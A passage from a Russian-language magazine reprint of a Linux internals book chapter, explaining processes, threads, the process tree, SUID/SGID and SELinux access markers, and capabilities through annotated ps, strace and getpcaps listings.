  300490752 байт (300 MB, 286 MiB) скопирован, 14,6916 c, 20,5 MB/c


  ❷ [1]+  Завершён            dd if=/dev/dvd of=plan9.iso


В следующем листинге показа на конвейерная конструкция интерпретатора,
при помощи которой осу ществляется поиск самого большого фай ла с суф‐
фиксом .html вниз по дереву каталогов, начиная с /usr/share/doc. Эта
конструкция реализуется при помощи fork‐and‐exec четырьмя парал лельно
порожденными дочер ними про цес сами интерпретатора, в каждом из которых
запущена программа соответствующей части конвейера, при этом дочерние
процессы связаны неименованным каналом pipe — простей шим средством
межпроцессного взаимодействия. Встроенная команда интерпре татора wait
реализует одноименный системный вызов и используется для ожидания
окончания  всех дочерних процессов  конвейера, целиком запущенного
в «фоновом» режиме.


Парал лельный запуск взаимо действу ющих программ


  fitz@ubuntu:~$ find /usr/share/doc ‐type f ‐name '.html' | xargs ‐n1 wc
  –l | sort ‐k 1 –nr | head ‐1 &
   [1] 12827
  fitz@ubuntu:~$ ps fj
   PPID   PID  PGID   SID TTY      TPGID STAT   UID   TIME COMMAND
  11715 11716 11716  9184 pts/0    14699 S     1006   0:01 ‐bash
  11716 12824 12824  9184 pts/0    14699 R     1006   0:00    _ find ... ‐
  type f ‐name *.html
  11716 12825 12824  9184 pts/0    14699 R     1006   0:00    _ xargs ‐n1
  wc ‐l
  11716 12826 12824  9184 pts/0    14699 S     1006   0:00    _ sort ‐k 1
  ‐nr
  11716 12827 12824  9184 pts/0    14699 S     1006   0:00    _ head ‐1
  11716 14699 14699  9184 pts/0    14699 R+    1006   0:00    _ ps fj
  fitz@ubuntu:~$ wait
  15283 /usr/share/doc/xterm/xterm.log.html
  [1]+  Завершён find /usr/share/doc ‐type f ‐name '.html' | xargs ‐n1 wc
  ‐l | sort ‐k 1 ‐nr | head ‐1



Параллельные многопроцессные программы
Как указывалось ранее, параллельные программы зачас тую используют про‐
цессы для выполнения отдельных ветвей. В эту категорию часто попадают
программы сетевых служб, например сервер баз данных W:[PostgreSQL],
служба удаленного доступа W:[SSH] и подобные. Следующий лис тинг иллюс‐
трирует программу postgres, выполняющуюся в шести параллельных процес‐
сах, один из которых — диспетчер ❶, четыре служеб ных ❷ и еще один ❸ выз‐
ван подклю чением поль зователя fitz к одно именной базе данных fitz.
При последующих подклю чениях пользователей к серверу будут порождены
дополнительные дочерние процессы для обслу живания их запросов —
по одному на каждое подключение.


Парал лельные мно гопроцессные сервисы


  fitz@ubuntu:~$ ps f ‐C postgres
    PID TTY      STAT   TIME COMMAND
  ❶  6711 ?        S      0:00 /usr/lib/postgresql/11/bin/postgres ‐D
  /var/lib/postgresql...
  ❷  6713 ?        Ss     0:00    _ postgres: 11/main: checkpointer
  │  6714 ?        Ss     0:00    \_ postgres: 11/main: background writer
  │  6715 ?        Ss     0:00    \_ postgres: 11/main: walwriter
  │  6716 ?        Ss     0:00    \_ postgres: 11/main: autovacuum launch‐
  er
  │  6717 ?        Ss     0:00    \_ postgres: 11/main: stats collector
  6718 ?        Ss     0:00    \_ postgres: 11/main: logical replication
  launcher
  ❸  9443 ?        Ss     0:00    _ postgres: 11/main: fitz  fitz [local]
  idle
  fitz@ubuntu:~$ ssh ubuntu
  fitz@ubuntu's password:
  ...
  Last login: Sat Nov 21 13:29:33 2015 from localhost
  fitz@ubuntu:~$ ps f ‐C sshd
       PID TTY      STAT   TIME COMMAND
  ①   655 ?        Ss     0:00 /usr/sbin/sshd ‐D
  ② 21975 ?        Ss     0:00    _ sshd: fitz [priv]
  ③ 22086 ?        S      0:00    _ sshd: fitz@pts/1
  fitz@ubuntu:~$ ^Dвыход
  Connection to ubuntu closed.


Аналогично, при удаленном дос тупе по про токолу SSH программа sshd,
работая в качестве диспетчера ① в одном процессе, на каждое подключение
порождает один свой клон ②, который, выполнив аутентификацию и авто‐
ризацию пользователя в системе, порождает еще один свой клон ③,
имперсонирующийся в пользователя и обслуживающий его запросы.


Параллельные многонитевые программы
Для управления нитями в Linux используют стандартный POSIX‐интерфейс
pthreads, реализующийся библиотекой W:[NPTL], которая явля ется частью
библиотеки libc. Интерфейс предос тавляет «нитевой» вызов создания нити
pthread_create, который является условным ана логом «процес сных» fork
и exec, вызов завершения и уничтожения нити pthread_exit, условно ана‐
логичный exit, и вызов для получения ста туса завершения нити pthread‐
_join, условно аналогичный wait.
  В  качестве  типичных примеров при менения нитей можно привести
сетевые сервисы, которые для параллельного обслуживания клиентских зап‐
росов используют нити вмес то процессов. Например, WEB‐сервер apache,
как показано в следующем листинге, использует два многонитевых процесса
по 27 нитей в каждом, что позволяет экономить память (за счет работы всех
нитей процесса с общей памятью) при обслуживании большого количества
одновременных клиентских подключений.


Парал лельные мно гонитевые сервисы


  fitz@ubuntu:~$ ps f ‐C apache2
    PID TTY      STAT  TIME COMMAND
  10129 ?        Ss    0:00 /usr/sbin/apache2 ‐k start
  10131 ?        Sl    0:00    _ /usr/sbin/apache2 ‐k start
  10132 ?        Sl    0:00    _ /usr/sbin/apache2 ‐k start
  fitz@ubuntu:~$ ps fo pid,nlwp,cmd ‐C apache2
    PID NLWP CMD
  10129 1    /usr/sbin/apache2 ‐k start
  10131 27      _ /usr/sbin/apache2 ‐k start
  10132 27      _ /usr/sbin/apache2 ‐k start


  fitz@ubuntu:~$ ps ‐fLC rsyslogd
  UID    PID  PPID LWP  C NLWP STIME TTY     TIME CMD
  syslog 606     1 606  0    4 ноя18 ?   00:00:00 /usr/sbin/rsyslogd ‐n ‐
  iNONE
  syslog 606     1 680  0    4 ноя18 ?   00:00:00 /usr/sbin/rsyslogd ‐n ‐
  iNONE
  syslog 606     1 681  0   4 ноя18 ?   00:00:00 /usr/sbin/rsyslogd ‐n ‐
  iNONE
  syslog 606     1 682  0    4 ноя18 ?   00:00:00 /usr/sbin/rsyslogd ‐n ‐
  iNONE


Аналогично,  сервис  центра лизованной  журнализации  событий  rsyslogd
использует нити для параллельного сбора событийной информации из раз‐
ных источников, ее обра ботки и журнализа ции. Одна нить считывает события
ядра из /proc/kmsg, вто рая принимает события дру гих служб из фай лового
сокета /run/systemd/journal/syslog (/dev/log в ранних, до systemd сис‐
темах), третья фильтрует поток принятых событий и записы вает в журнальные
файлы каталога /var/log/* и т. д. Параллельная обработка потоков поступа‐
ющих событий при помощи нитей произво дится с минимально возможными
накладными расходами, что позволяет дос тигать колоссальной произво‐
дительности по количеству обра батываемых сооб щений в единицу времени.
   Распараллеливание использует ся не только для псевдоодновременного
выпол нения ветвей параллельной программы, но и для их настоящего
одновременного выполнения несколькими центральными процессорами.
В примере из следующего листинга показано, как сокращается время сжатия
ISO‐образа  файла  при  использовании  параллельного   упаковщика
pbzip2 по сравнению с пос ледова тельным bzip2. Для изме рения времени упа‐
ковки применяется встроенная команда интерпретатора time, при этом сна‐
чала измеряется время упа ковки ❶ и время распаковки ❷ пос ледовательным
упаковщиком, а затем — время упа ковки ① и время рас паковки ② парал‐
лельным упаков щиком. Команды упа ковки запускаются на «заднем фоне»,
оценивается наличие про цес сов и нитей паковщиков, после чего они перево‐
дятся на «передний фон» встроенной командой интерпре татора fg (fore‐
ground) и оцениваются затраты времени.


Парал лельные мно гонитевые утилиты


  fitz@ubuntu:~$ ls ‐lh plan9.iso
  ‐rw‐r‐‐r‐‐ 1 fitz fitz 287M нояб. 28 15:47 plan9.iso
  ❶ fitz@ubuntu:~$ time bzip2 plan9.iso &
  [1] 5545
  fitz@ubuntu:~$ ps f
    PID TTY      STAT   TIME COMMAND
   4637 pts/0    S      0:00 ‐bash
   5545 pts/0    S      0:00    _ ‐bash
   5546 pts/0    R      0:12    _ bzip2 plan9.iso
   5548 pts/0    R+     0:00    _ ps f
  fitz@ubuntu:~$ ps ‐fLp 5546
  UID        PID  PPID   LWP  C NLWP STIME TTY          TIME CMD
  fitz      5546  5545  5546 96   1 10:50 pts/0    00:00:22 bzip2
  plan9.iso
  fitz@ubuntu:~$ fg
  time bzip2 plan9.iso


  real  0m54.780s
  user  0m51.772s
  sys 0m0.428s
  fitz@ubuntu:~$ ls ‐lh plan9.iso.bz2
  ‐rw‐r‐‐r‐‐ 1 fitz fitz 89M нояб. 28 15:47 plan9.iso.bz2
  ❷ fitz@ubuntu:~$ time bzip2 ‐d plan9.iso.bz2


  real  0m20.705s
  user  0m19.044s
  sys 0m1.168s
  ① fitz@ubuntu:~$ time pbzip2 plan9.iso &
  [1] 5571
  fitz@ubuntu:~$ ps f
    PID TTY      STAT   TIME COMMAND
   4637 pts/0    S      0:00 ‐bash
   5571 pts/0    S      0:00 ‐bash
   5572 pts/0    Sl     0:03    _ pbzip2 plan9.iso
   5580 pts/0    R+     0:00    _ ps f
  fitz@ubuntu:~$ ps ‐fLp 5572
  UID        PID  PPID   LWP  C NLWP STIME TTY          TIME CMD
  fitz      5572  5571  5578 92   8 10:52 pts/0    00:00:43 pbzip2
  plan9.iso
  ...
  fitz      5572  5571  5579  1    8 10:52 pts/0    00:00:00 pbzip2
  plan9.iso
  fitz@ubuntu:~$ fg
  time pbzip2 plan9.iso


  real  0m24.259s
  user  1m22.940s
  sys 0m1.888s
  fitz@ubuntu:~$ ls ‐lh plan9.iso.bz2
  ‐rw‐r‐‐r‐‐ 1 fitz fitz 89M нояб. 28 15:47 plan9.iso.bz2
  ② fitz@ubuntu:~$ time pbzip2 ‐d plan9.iso.bz2


  real  0m7.384s
  user  0m25.972s
  sys 0m1.396s


В  результате  оцен ки  оказывается,  что  пос ледовательный  упаковщик
bzip2 использует один одно нитевой процесс и затрачивает ≈54,7 с реального
времени на упаковку, из них ≈51,7 с проводит в пользовательском режиме
user и лишь ≈0,4 с в режиме ядра sys (выполняя системные вызовы, нап‐
ример read или write). Соотношение меж ду временем режимов говорит
о вычислительном характере программы, т. е. о существенном превалирова‐
нии времени вычислительных операций упаковки над временем операций
ввода‐вывода для чтения исходных данных и записи результатов. Это озна‐
чает, что нагрузка последова тельного упаковщика на центральный процессор
(в случае, если бы он был единс твенный) близ ка к максимальной, и его
парал лельная реализация для псевдоодновременного выполнения ветвей
(которые практически никогда не спят) лишена смыс ла.
  Параллельный упаковщик pbzip2 использует один многонитевой процесс
из восьми нитей и затрачивает ≈24,4 с реального времени на упаковку,
при этом ≈1 мин 22,9 с (!) проводит в пользователь ском режиме и ≈1,8 с в
режиме ядра. Прирост производитель ности упаковки и, как следствие, сок‐
ращение времени упаковки достигаются за счет нас тоящего параллельного
выпол нения нитей на нескольких процессорах (разных ядрах процессора).
Соотношение между реальным временем упа ковки и суммарно затраченным
временем режима пользователя, которое примерно в 3 раза больше, озна‐
чает использование в среднем трех процессоров для параллельного выпол‐
нения вычислительных операций упа ковки.


                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ

 ПРОЦЕССЫ И ПАМЯТЬ
               LINUX            В
                           ОТРЫВОК ИЗ КНИГИ
                  «ВНУТРЕННЕЕ УСТРОЙСТВО LINUX»





Двойственность процессов и нитей Linux
Как указывалось ранее, процессы и нити в ядре Linux сводятся к универсаль‐
ному понятию «задача». Задача, все ресурсы которой (память, откры тые фай‐
лы и т. д.) используются совмес тно с другими такими же задачами, явля ется
нитью. И наоборот, процессами являются такие задачи, которые обладают
набором своих частных, индивиду альных ресурсов.
   Универсальный системный вызов clone позволя ет указать, какие ресурсы
станут общими в порождаемой и порождающей задачах, а какие — частными.
Системные вызовы порождения POSIX‐процес сов fork и POSIX‐нитей
pthread_create оказываются в Linux всего лишь «обертками» над clone, что
проиллюстрировано в двух следующих листингах.
  В первом примере архиватор tar PID = 11801 создает при помощи сис‐
темного вызова clone дочерний про цесс PID = 11802, в который помещает
программу компрессора gzip, используя системный вызов execve. В резуль‐
тате параллельной работы двух взаимодей ству ющих процессов будет создан
компрессированный архив docs.tgz каталога /usr/share/doc.


Системный вызов clone — порож дение нового про цесса


  fitz@ubuntu:~$ strace ‐fe clone,fork,execve tar czf docs.tgz
  /usr/share/doc
  execve("/usr/bin/tar", ["tar", "czf", "docs.tgz", "/usr/share/doc"], ...
  ) = 0
    clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|
  ...) = 12403
  tar: Удаляется начальный /' из имен объектов
  strace: Process 12403 attached[pid 12403] execve("/bin/sh", ["/bin/sh",
  "‐c", "gzip"], 0x7ffd8dd597c0 ...) = 0[pid 12403]
  clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID| ...) = 12404strace:
  Process 12404 attached[pid 12404] execve("/usr/bin/gzip", ["gzip"],
  0x55e2e45bbb48 /* 35 vars */) = 0`


  ...
  +++ exited with 0 +++


В примере из следующего листинга компрессор pbzip2 соз дает при помощи
системного вызова clone семь «дочерних» нитей ❶...❼ PID = 12514‐>12520,
которые имеют общую память CLONE_VM, общие откры тые файлы CLONE_‐
FILES и прочие общие ресурсы.


Системный вызов clone — порож дение новой нити


  fitz@ubuntu:~$ strace ‐fe clone,fork,execve pbzip2 plan9.iso
  execve("/usr/bin/pbzip2", ["pbzip2", "plan9.iso"], 0x7ffd28884938 /* 35
  vars */) = 0
  ❶ clone(child_stack=0x7f1d46d38fb0,
  flags=CLONE_VM|CLONE_FS|CLONE_FILES|... ) = 12514
  5     ...
  ❼ clone(child_stack=0x7f1d46537fb0,
  flags=CLONE_VM|CLONE_FS|CLONE_FILES|...) = 12520
  strace: Process 12520 attached
  5     ...
  strace: Process 12514 attached
  [pid 12514] <span class=nobr>+ exited with 0 span>+
  5     ...
  [pid 12520] <span class=nobr>+ exited with 0 span>+
  +++ exited with 0 +++



ДЕРЕВО ПРОЦЕССОВ
Процессы, попарно свя занные дочерне‐родительскими отношениями, фор‐
мируют дерево процессов операционной сис темы. Первый процесс init,
называемый пра родителем процес сов, порождается ядром опе рационной
системы после инициализации и монтирова ния корневой файловой системы,
откуда и считывается программа /sbin/init (в современных системах явля‐
ется символической ссылкой на акту альный /lib/systemd/systemd). Пра‐
родитель процессов всегда имеет PID = 1, а его основной задачей является
запуск разнообразных системных служб, включая запуск обработчиков алфа‐
витно‐цифрового тер минального дос тупа getty, менеджера диспле ев гра‐
фического доступа, службы дистанционного доступа SSH и прочих (см. гла‐
ву 10). Кроме того, systemd наз нача ется приемным родителем для «оси‐
ротевших» процессов, а также отслежива ет аварийные завершения запус‐
каемых им служб и переза пус кает их.
  В примере из следующего листинга показа но дерево процессов, постро‐
енное при помощи специальной команды pstree, а в листинге “Процессы
ядра, демоны, прик ладные процес сы” — «классичес кое» представление
дерева процессов при помощи команды ps.


Де рево про цессов


  fitz@ubuntu:~$ pstree ‐cnAhT
  systemd‐+‐systemd‐journal
       ❷ |‐systemd‐udevd
       ❷ |‐systemd‐resolve
       ❷ |‐rsyslogd
          ...
          |‐gdm3‐‐‐gdm‐session‐wor‐+‐gdm‐session‐wor
          |                        |‐gdm‐x‐session‐+‐Xorg
          |                        |               ‐gnome‐session‐b
          ...
          |‐systemd‐+‐(sd‐pam)
          ...
          |         |‐gnome‐terminal‐‐+‐bash‐‐‐man‐‐‐pager ❸
          |         |‐bash
          ...
       ❷ |‐postgres‐+‐postgres
          |          |‐postgres
          |          |‐postgres
          |          |‐postgres
          |          |‐postgres
          |          ‐postgres
       ❷ |‐apache2‐+‐apache2
          |‐apache2
          ...
       ❷ |‐sshd‐+‐sshd‐‐‐sshd‐‐‐bash
          |      `‐sshd‐‐‐sshd‐‐‐bash
          ...
          |‐agetty
          |‐login‐‐‐bash‐‐‐pstree ❸
          ...


Процессы операционной системы принято классифицировать на сис темные
(ядерные), де моны и прик ладные, исходя из их назначения и свойств (см.
листинг “Процессы ядра, демоны, прикладные процессы”).
   Прикладные процессы ❸ выполняют обычные пользовательские прог‐
раммы (нап ример, утилиту man), для чего им выделяют индивидуальную
память, объем которой ука зан в столбце VSZ вывода команды ps. Такие про‐
цессы обычно интерактивно вза имодейству ют с поль зовате лем посредством
управляющего терминала (за исклю чени ем графических программ), указан‐
ного в столбце TTY.
  Демоны (daemons) ❷ выполняют сис темные программы, реализующие те
или иные службы операционной системы. Например, cron реализует службу
периодического выпол нения заданий, atd — службу отложенного выполнения
заданий,  rsyslogd — службу централизованной журнализации  событий,
sshd — службу дистанционно го дос тупа, systemd‐udevd — службу «регистра‐
ции» подключаемых устройств, и т. д. Демоны запускаются на ранних стадиях
загрузки  операционной  системы  и  взаимодействуют  с  пользовате лем
не интерактивно при помощи терминала, а опос редованно — при помощи
своих утилит. Таким образом, отсутствие управляющего терминала в столбце
TTY отличает их от прик ладных процессов.


Про цессы ядра, демоны, прик ладные про цессы


  fitz@ubuntu:~$ ps faxu
  USER      PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
  root       2  0.0  0.0      0     0 ?        S    ноя18   0:00
  [kthreadd]
  root       3  0.0  0.0      0     0 ?        I<   ноя18   0:00    _
  [rcu_gp]
  root       4  0.0  0.0      0     0 ?        I<   ноя18   0:00    _
  [rcu_par_gp]
  root       6  0.0  0.0      0     0 ?      ❶ I<   ноя18   0:00    _
  [kworker/0:0H...]
  root       8  0.0  0.0      0     0 ?        I<   ноя18   0:00    _
  [mm_percpu_wq]
  root       9  0.0  0.0      0     0 ?        S    ноя18   0:09    _
  [ksoftirqd/0]
  ...
  root       1  0.0  0.2 168400 11684 ?        Ss   ноя18   0:12
  /sbin/init splash
  ...
  root     333  0.0  0.1  21844  5348 ?        Ss   ноя18   0:07 /lib/sys‐
  temd/systemd‐udevd
  syslog   606  0.0  0.1 224360  4244 ?        Ssl  ноя18   0:01
  /usr/sbin/rsyslogd ‐n –i...
  ...
  root     649  0.0  0.0  20320  3036 ?      ❷ Ss   ноя18   0:00
  /usr/sbin/cron ‐f
  daemon   675  0.0  0.0   3736  2184 ?        Ss   ноя18   0:00
  /usr/sbin/atd –f
  ...
  root   21545  0.0  0.0   5560  3420 tty4     Ss   ноя18   0:00 /bin/lo‐
  gin ‐p ‐‐
  fitz   28152  0.0  0.0   2600  1784 tty4     S    01:38   0:00    _ ‐sh
  fitz   28162  0.0  0.0  12948  3584 tty4     S+   01:38   0:00    _ bash
  finn   12989  0.2  0.0 12092  3988 tty4   ❸ S+   13:47   0:00    _ man
  ps
  finn   13000  0.0  0.0  10764  2544 tty4     S+   13:47   0:00    _
  pager



             INFO

                     Зачастую демоны имеют суффикс d в конце наз‐
                         вания, например sshd — это secure shell daemon,
                       а rsyslogd — rocket system logging daemon, и т. д.


Системные (ядерные) ❶ процессы (gра вильнее — ядерные нити, т. к. выпол‐
няются они в общей памяти ядра операционной системы) выполняют парал‐
лельные части яд ра операционной системы, поэтому не обладают ни инди‐
видуальной виртуальной памятью VSZ, ни управляющим терминалом TTY.
Более того, ядерные процессы не выпол няют отдельную программу, загружа‐
емую из ELF‐файла, поэто му их имена COMMAND являются условными
и изображаются в квадратных скоб ках, а кро ме того, они имеют особое сос‐
тояние I в столбце STAT.


АТРИБУТЫ ПРОЦЕССА
Процесс в операционной системе явля ется основным активным субъ ектом,
взаимодействующим с окру жающими его объ ектами — файлами и фай‐
ловыми системами, другими процессами, устройствами и пр. Воз можнос ти
процесса выполнять те или иные действия по отношению к другим объ ектам
определяются его специальными свойства ми — атрибутами процесса.


Маркеры доступа
Возможности процесса по отношению к объектам, доступ к которым разгра‐
ничивается при помощи дискреционных механиз мов (в частнос ти, к фай лам
дерева каталогов) определяются значениями его атрибутов, формиру ющих
его DAC‐мар кер доступа, а именно — атри бута ми RUID, RGID, EUID, EGID, см.
credentials.
  Эффективные идентифика торы EUID (eﬀective user identiﬁer) и EGID (eﬀec‐
tive group identiﬁer) ука зывают на «эффективных» пользователя и группу,
использующихся дискреционными механизмами для определения прав дос‐
тупа процесса к файлам и другим объектам согласно назначенному им
режиму или списку дос тупа. Атрибуты RUID (real user identiﬁer) и RGID (real
group identiﬁer) указывают на «настоящих» поль зователя и группу, «управля‐
ющих» процессом.
  Первому процессу пользовательского сеанса  (в случае регистрации
в системе
с использованием алфа витно‐цифрового терминала — командному интер‐
претатору) назначают атрибуты RUID/EUID и RGID/EGID равными иден‐
тификаторам зарегистрировавшегося пользователя и его первичной группы.
Последующие процессы пользовательского сеанса наследуют значения
атрибутов, т. к. порождаются в результате клониро вания при помощи fork.
В примере из следующего листинга при помощи команды id показаны зна‐
чения EUID/EGID пользовательско го сеанса и их нас ледование от командно‐
го интерпретато ра, что явным образом подтверждает команда ps.


DAC-маркер доступа про цесса — атрибуты RUID, EUID, RGID, EGID


  fitz@ubuntu:~$ id
  uid=1006(fitz) gid=1008(fitz) группы=1008(fitz)
  fitz@ubuntu:~$ ps fo euid,ruid,egid,rgid,user,group,tty,cmd
   EUID  RUID  EGID  RGID  USER  GROUP  TT    CMD
   1006  1006  1008  1008  fitz  fitz   pts/2 ‐bash
   1006  1006  1008  1008  fitz  fitz   pts/2   _ ps fo
  euid,uid,egid,...,tty,cmd


Изменение идентификаторов EUID/EGID процес са происходит при срабаты‐
вании механизма неявной передачи полномочий, основанном на допол‐
нительных атрибутах SUID/SGID файлов программ. При запуске таких прог‐
рамм посредством сис темного вызова exec атри буты EUID/EGID запус‐
кающего процесса устанавливаются равными идентификаторам UID/GID вла‐
дельца запускаемой программы. В результате процесс, в который будет заг‐
ружена такая программа, будет обладать правами владельца программы,
а не правами пользователя, запус тившего эту программу.
  В  следующем  листинге  приведен  типичный  при мер  использования
механизма неявной переда чи полномочий при выполнении команд passwd
и wall. При смене пароля поль зователем при помощи программы /usr/bin/
passwd ее процесс получа ет необ ходимое пра во записи ① в файл /etc/
shadow в результате передачи полномочий ❶ суперпользователя root  (
UID=0). При передаче широковещательного сооб щения всем пользователям
при помощи /usr/bin/wall необ ходимо иметь право записи ② в их файлы
устройств /dev/tty*, которое появляется ❷  в результате передачи пол‐
номочий группы tty (GID = 5).


Атрибуты файла SUID/SGID и атрибуты про цесса RUID, EUID,
RGID, EGID


  fitz@ubuntu:~$ who
  fitz     pts/0        2019‐11‐22 00:52 (:0.0)
  fitz     pts/1        2019‐11‐22 00:53 (:0.0)
  fitz     pts/2        2019‐11‐22 01:06 (:0.0)


  fitz@ubuntu:~$ ls ‐la /etc/shadow /dev/pts/*
    crw‐‐w‐‐‐‐ 1 fitz tty    136, 2 ноя 19 12:00 /dev/pts/1
  ② crw‐‐w‐‐‐‐ 1 fitz tty    136, 3 ноя 19 13:53 /dev/pts/2
    c‐‐‐‐‐‐‐‐‐ 1 root root     5, 2 ноя 17 03:30 /dev/pts/ptmx
  ① ‐rw‐r‐‐‐‐‐ 1 root shadow   1647 ноя 19 12:27 /etc/shadow


  fitz@ubuntu:~$ ls ‐l /usr/bin/passwd /usr/bin/wall
  ‐rwsr‐xr‐x 1  root   root 67992 авг 29 16:00 /usr/bin/passwd
  ‐rwxr‐sr‐x 1    root  tty 35048 авг 21 16:19 /usr/bin/wall


  fitz@ubuntu:~$ ls ‐ln /usr/bin/passwd /usr/bin/wall
  ‐rwsr‐xr‐x 1  0    0 67992 авг 29 16:00 /usr/bin/passwd
  ‐rwxr‐sr‐x 1    0  5 35048 авг 21 16:19 /usr/bin/wall


  fitz@ubuntu:~$ ps ft pts/1,pts/2 o pid,ruid,rgid,euid,egid,tty,cmd
      PID  RUID  RGID  EUID  EGID TT     CMD
    27883  1006  1008  1006  1008 pts/2  bash
  ❷ 27937  1006  1008  1006  5    pts/2     _ wall
    27124  1006  1008  1006  1008 pts/1  bash
  ❶ 27839  1006  1008  0    1008 pts/1     _ passwd


По отношению к объектам, доступ к которым ограничивается при помощи
мандатных механизмов, воз можнос ти про цес са определяются значениями
его МАС‐маркера доступа, а именно — атрибутом мандатной метки LABEL.
Как и RUID/EUID/RGID/EGID, атрибут LABEL назначается первому процессу
сеанса пользователя явным образом, а затем нас ледуется при клонировании
процессами‐потомками от процессов‐родите лей. В при мере из приведен‐
ного ниже листинга при помощи команды id показан атрибут LABEL сеанса
пользователя, а при помощи команды ps — его явное наследование от про‐
цесса‐родителя.
   Аналогично изменениям EUID/EGID процес са, про исходящим при запуске
SUID‐ной/SGID‐ной программы, изменение метки LABEL процес са происхо‐
дит (согласно мандатным правилам ❶) в системном вызове exec при запус ке
программы, помеченной соответству ющей мандатной меткой файла. Так,
например, при запуске программы /usr/sbin/dhclient с типом dhcpc_ex‐
ec_t ее мандатной метки ❸ процесс приобретает тип dhcpc_t своей ман‐
датной метки ❹, в резуль тате чего существенно ограничивается в правах дос‐
тупа к разным объектам операционной системы.


MAC-маркер доступа про цесса — ман датная метка selinux


  fitz@ubuntu:~$ ssh lich@fedora
  lich@fedora's password:
  Last login: Sat Nov 21 14:25:16 2015


  [lich@centos ~]$ id ‐Z
  staff_u:staff_r:staff_t:s0‐s0:c0.c1023


  [lich@centos ~]$ ps Zf
  LABEL                                    PID TTY   STAT  TIME COMMAND
  staff_u:staff_r:staff_t:s0‐s0:c0.c1023 31396 pts/0 Ss    0:00 ‐bash
  staff_u:staff_r:staff_t:s0‐s0:c0.c1023 31835 pts/0 R+    0:00    _ ps Zf
  staff_u:staff_r:staff_t:s0‐s0:c0.c1023 31334 tty2  Ss+   0:00 ‐bash
  [lich@centos ~]$ sesearch ‐T ‐t dhcpc_exec_t ‐c process
  Found 19 semantic te rules:
  ...
  ❶    type_transition NetworkManager_t dhcpc_exec_t : process dhcpc_t;
  ...


  [lich@centos ~]$ ls ‐Z /usr/sbin/dhclient
  ❷ ‐rwxr‐xr‐x. root root system_u:object_r:dhcpc_exec_t:s0
  /usr/sbin/dhclient
  [lich@centos ~]$ ps ‐ZC dhclient
  LABEL                             PID TTY TIME      CMD
  ❸ system_u:system_r:dhcpc_t:s0    2120 ?  00:00:00 dhclient
    system_u:system_r:dhcpc_t:s0    4320 ?  00:00:00 dhclient



Привилегии
Еще одним важным атрибутом процес са, определя ющим его возможности
по использованию системных вызовов, являются привиле гии процес са caba‐
bilities. Например, обладание привилегией CAP_SYS_PTRACE разрешает
процессам трассировщиков strace и ltrace, использующих системный
вызов ptrace, трассировать процес сы лю бых пользователей (а не только
«свои», EUID которых совпада ет с EUID трас сировщика). Аналогично, при‐
вилегия CAP_SYS_NICE раз реша ет изменять приори тет, устанавливать при‐
вязку  к процессорам и наз начать алгоритмы планирования процессов
и нитей лю бых пользователей, а привилегия CAP_KILL разрешает посылать
сигналы процессам лю бых пользователей.
  Явная привилегия «владельца» CAP_FOWNER позволя ет процес сам изме‐
нять режим и списки доступа, мандатную метку, расширенные атрибуты
и флаги любых файлов так, словно про цесс выполняется от лица владельца
файла. Привиле гия CAP_LINUX_IMMUTABLE раз реша ет управлять флагами
файлов i, immutable и a, append, а привилегия CAP_SETFCAP — устанав‐
ливать «файловые» при вилегии запус каемых программ.
  Необходимо отметить, что именно обладание полным набором привиле‐
гий  делает  поль зователя  root  (UID=0)  в  Linux  суперпользователем.
И наоборот, обычный, непривилегированный поль зователь (в смысле UID≠0)
не обладает никакими явными привилегиями (неявно он обладает привиле‐
гией владельца для всех своих объектов). Наз начение привилегий процесса
(здесь допущено намеренное упрощение механиз ма наследования и наз‐
начения привилегий при fork и exec без потери смысла) происходит
при запуске программы при помощи системного вызова exec, исполняемый
файл которого помечен «файловыми» при вилегиями.
  В примере из следующего листинга иллюстри руется получение спис ка
привилегий процесса при помощи утилиты getpcaps. Как и ожидалось, про‐
цесс postgres (PID=6711), работающий от лица обычного (непривилегиро‐
ванного, в смысле UID≠0) псевдополь зователя postgres, не име ет ❶ никаких
привилегий, а процесс apache2 (PID=10129), работающий от лица супер‐
пользователя root (UID=0), имеет пол ный ❷ набор привилегий. Однако
процесс NetworkManager  (PID=646) выполняется от лица «суперполь‐
зователя», лишенного ❸ большинства сво их привилегий, т. к. ему их умыш‐
ленно уменьшили при его запуске (см. systemd в главе 8) до минимально
необходимого набора, достаточного для выполнения его функций (xто спо‐
собствует обеспечению защищен ности операционной сис темы).


Привиле гии (capabilities) про цесса


  fitz@ubuntu:~$ ps fo user,pid,cmd ‐C NetworkManager,postgres,apache2
  USER       PID CMD
  root     10129 /usr/sbin/apache2 ‐k start
  www‐data 10131    _ /usr/sbin/apache2 ‐k start
  www‐data 10132    _ /usr/sbin/apache2 ‐k start
  postgres  6711 /usr/lib/postgresql/11/bin/postgres ‐D /var/lib/post‐
  gresql/11/main ...
  postgres  6713    _ postgres: 11/main: checkpointer
  postgres  6714    _ postgres: 11/main: background writer
  postgres  6715    _ postgres: 11/main: walwriter
  postgres  6716    _ postgres: 11/main: autovacuum launcher
  postgres  6717    _ postgres: 11/main: stats collector
  postgres  6718    _ postgres: 11/main: logical replication launcher
  root       646 /usr/sbin/NetworkManager ‐‐no‐daemon


  fitz@ubuntu:~$ getpcaps 6711
  ❶ Capabilities for 6711': =
  ❷ fitz@ubuntu:~$ getpcaps 10129
  Capabilities for10129': = cap_chown,cap_dac_override,cap_dac_read‐
  _search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,
  cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_
  broadcast,cap_net_
  admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawi
  o,cap_sys_chroot,
  cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap
  _sys_resource,cap_
  sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_au‐
  dit_control,cap_
  setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_blo
  ck_suspend,
  cap_audit_read+ep
  ❸ fitz@ubuntu:~$ getpcaps 646
  Capabilities for `646': = cap_dac_override,cap_kill,cap_setgid,cap_setu‐
  id,cap_net_bind_service,cap_net_admin,
  cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write+ep


В листинге ниже показан типичный пример применения отдельных привиле‐
гий там, где классичес ки применя ется неявная передача всех пол номочий
